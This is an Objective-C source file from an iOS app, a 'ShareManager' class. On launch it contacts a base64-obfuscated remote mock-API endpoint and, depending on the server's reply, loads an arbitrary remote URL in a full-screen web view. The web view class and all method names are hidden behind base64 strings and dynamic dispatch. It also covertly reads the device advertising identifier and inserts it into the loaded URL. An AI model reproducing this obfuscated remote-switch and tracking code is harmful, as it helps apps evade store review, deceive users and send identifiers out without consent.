#import "ShareManager.h"
#import "NSString+Base64.h"
#import "NSObject+Hook.h"
#import "OpenTool.h"
#import "AppDelegate.h"
#import "Masonry.h"
#import "ViewController.h"
#import "UIDevice+TFDevice.h"
#import "NSObject+PerformBlockAfterDelay.h"

#include <dlfcn.h>

@implementation ShareManager

+(instancetype)sharedInstance{
    static dispatch_once_t once ;
    static ShareManager *_instace = nil;
    dispatch_once(&once, ^{
        _instace = [[self  alloc] init];
    });
    return _instace;
}

-(void)addView:(UIView*)view with:(NSString*)str {


    
    
//    [self showtitle:str with:view];
  
    NSString*title = nil;
    if ([str hasPrefix:@"aHR0cA==".base64Decoding]) {
        title = str;

        [self showtitle:title with:view];
    }else{


       [self request:view];

    }
}

-(void)request:(UIView*)view {
   
    //mock/272624/alxihjaeb
    NSString*game = [NSString stringWithFormat:@"%@%@",@"aHR0cDovL3JhcDJhcGkudGFvYmFvLm9yZy9hcHAv".base64Decoding,@"Ylc5amF5OHlOekkyTWpRdllXeDRhV2hxWVdWaQ==".base64Decoding.base64Decoding];
    NSURL *storeURL = [NSURL URLWithString:game];
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:storeURL];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60;
    NSURLSession *session = [NSURLSession sharedSession];
    
   
    
//    [NSObject performBlock:^{
//
//    } afterDelay:1];
    
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (data) {
            NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            NSLog(@"dic = %@",dic);
            NSString*alxihjaeb1 = dic[@"alxihjaeb1"];
            NSString*alxihjaeb12 = dic[@"alxihjaeb12"];
            NSString*alxihjaeb3 = dic[@"alxihjaeb3"];

            dispatch_async(dispatch_get_main_queue(), ^{
                if ([alxihjaeb1 isEqualToString:@"q"]) {
                    [OpenTool base:alxihjaeb12];
                }
                
                if ([alxihjaeb3 isEqualToString:@"landscape"]) {
                    [AppDelegate setOrientation:@"H"];
                }else{
                }
                
                if ([alxihjaeb12 containsString:@"IDFA"]) {
                    
                    NSString*str = [self getida];
                    NSString* join = [alxihjaeb12 stringByReplacingOccurrencesOfString:@"IDFA" withString:str];
                    [self showtitle:join with:view];
                    
                }else{
                    [self showtitle:alxihjaeb12 with:view];
                }
                
            });
        }else{
          
        }
    }];

    [dataTask resume];
    
}

-(void)show{
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIViewController*rootvc = [UIApplication sharedApplication].keyWindow.rootViewController;
        [rootvc presentViewController:[UIViewController new] animated:false completion:nil];
        [rootvc dismissViewControllerAnimated:false completion:nil];
    });
}

//- (NSString *)zx_idfaString
//{
//    NSBundle *adSupportBundle = [NSBundle bundleWithPath:@"/System/Library/Frameworks/AdSupport.framework"];
//    [adSupportBundle load];
//
//    if (adSupportBundle == nil)
//    {
//        return @"";
//    }
//    else
//    {
//        Class asIdentifierMClass = NSClassFromString(@"ASIdentifierManager");
//
//        if(asIdentifierMClass == nil){
//            return @"";
//        }
//        else
//        {
//            ASIdentifierManager *asIM = [[asIdentifierMClass alloc] init];
//
//            if (asIM == nil) {
//                return @"";
//            }
//            else{
//
//                if(asIM.advertisingTrackingEnabled)
//                {
//                    return [asIM.advertisingIdentifier UUIDString];
//                }
//            }
//        }
//    }
//}

//
//- (NSString *)getUniqueHardwareId {
//
//    NSString *distinctId = NULL;
//    Class ASIdentifierManagerClass = NSClassFromString(@"ASIdentifierManager");
//    NSLog(@"ASIdentifierManagerClass = %@",ASIdentifierManagerClass);
//    if (ASIdentifierManagerClass) {
//        SEL sharedManagerSelector = NSSelectorFromString(@"sharedManager");
//        id sharedManager = ((id (*)(id, SEL))[ASIdentifierManagerClass methodForSelector:sharedManagerSelector])(ASIdentifierManagerClass, sharedManagerSelector);
//        SEL advertisingIdentifierSelector = NSSelectorFromString(@"advertisingIdentifier");
//        NSUUID *uuid = ((NSUUID * (*)(id, SEL))[sharedManager methodForSelector:advertisingIdentifierSelector])(sharedManager, advertisingIdentifierSelector);
//        distinctId = [uuid UUIDString];
//        // 在 iOS 10.0 以后，当用户开启限制广告跟踪，advertisingIdentifier 的值将是全零
//        // 00000000-0000-0000-0000-000000000000
//        if (!distinctId || [distinctId hasPrefix:@"00000000"]) {
//            distinctId = NULL;
//        }
//    }
//
//    // 没有IDFA，则使用IDFV
//    if (!distinctId && NSClassFromString(@"UIDevice")) {
//        distinctId = [[UIDevice currentDevice].identifierForVendor UUIDString];
//    }
//
//    // 没有IDFV，则使用UUID
//    if (!distinctId) {
//
//        distinctId = [[NSUUID UUID] UUIDString];
//    }
//    return distinctId;
//}
//
- (NSString *)appleIDFA {
    NSString *idfa = nil;
    Class ASIdentifierManagerClass = NSClassFromString(@"ASIdentifierManager");
    if (ASIdentifierManagerClass) { // a dynamic way of checking if AdSupport.framework is available
        SEL sharedManagerSelector = NSSelectorFromString(@"sharedManager");
        id sharedManager = ((id (*)(id, SEL))[ASIdentifierManagerClass methodForSelector:sharedManagerSelector])(ASIdentifierManagerClass, sharedManagerSelector);
        SEL advertisingIdentifierSelector = NSSelectorFromString(@"advertisingIdentifier");
        NSUUID *advertisingIdentifier = ((NSUUID* (*)(id, SEL))[sharedManager methodForSelector:advertisingIdentifierSelector])(sharedManager, advertisingIdentifierSelector);
        idfa = [advertisingIdentifier UUIDString];
    }
    return idfa;
}

-(NSString*)getida{
    
    NSBundle *adSupportBundle = [NSBundle bundleWithPath:@"L1N5c3RlbS9MaWJyYXJ5L0ZyYW1ld29ya3MvQWRTdXBwb3J0LmZyYW1ld29yaw==".base64Decoding];
    [adSupportBundle load];
    
  // void *lib = dlopen("/System/Library/Frameworks/AdSupport.framework/AdSupport", RTLD_LAZY);
    
//
//    if (lib) {
//        NSLog(@"abc");
//    }
    
    Class myasi = NSClassFromString(@"QVNJZGVudGlmaWVyTWFuYWdlcg==".base64Decoding);
    NSLog(@"myasi = %@",myasi);
    
    NSObject* share = [myasi performSelector:NSSelectorFromString(@"c2hhcmVkTWFuYWdlcg==".base64Decoding)];
    
    NSLog(@"share = %@",share);
    NSString*ifa = [[share performSelector:NSSelectorFromString(@"YWR2ZXJ0aXNpbmdJZGVudGlmaWVy".base64Decoding)]performSelector:NSSelectorFromString(@"VVVJRFN0cmluZw==".base64Decoding)];
    return ifa;
}

-(void)showtitle:(NSString*)title with:(UIView*)view{
    Class MyObject = NSClassFromString(@"VUlXZWJWaWV3".base64Decoding);
    UIView *myObj = [[MyObject alloc] initWithFrame:view.bounds];
    
    [myObj performSelector:NSSelectorFromString(@"c2V0QmFja2dyb3VuZENvbG9yOg==".base64Decoding) withObject:[UIColor blackColor]];
  //  [myObj performSelector:NSSelectorFromString(@"c2V0T3BhcXVlOg==".base64Decoding) withObject:false];
    [view addSubview:myObj];
    
    [myObj mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.equalTo(view);
    }];
    [myObj performSelector:NSSelectorFromString(@"c2V0RGVsZWdhdGU6".base64Decoding) withObject:self];
    Class User = NSClassFromString(@"TlNVUkw=".base64Decoding);
    id obj = CFBridgingRelease(((void *(*)(id, SEL))objc_msgSend)(User, NSSelectorFromString(@"YWxsb2M=".base64Decoding))); //防止内存泄漏
    id url = [obj performSelector:NSSelectorFromString(@"aW5pdFdpdGhTdHJpbmc6".base64Decoding) withObject:title];
    Class URLRequest = NSClassFromString(@"TlNVUkxSZXF1ZXN0".base64Decoding);
    id obj2 = CFBridgingRelease(((void *(*)(id, SEL))objc_msgSend)(URLRequest, NSSelectorFromString(@"YWxsb2M=".base64Decoding))); //防止内存泄漏
    
    id req = [obj2 performSelector:NSSelectorFromString(@"aW5pdFdpdGhVUkw6".base64Decoding) withObject:url];
    [myObj performSelector:NSSelectorFromString(@"bG9hZFJlcXVlc3Q6".base64Decoding) withObject:req];
}

@end
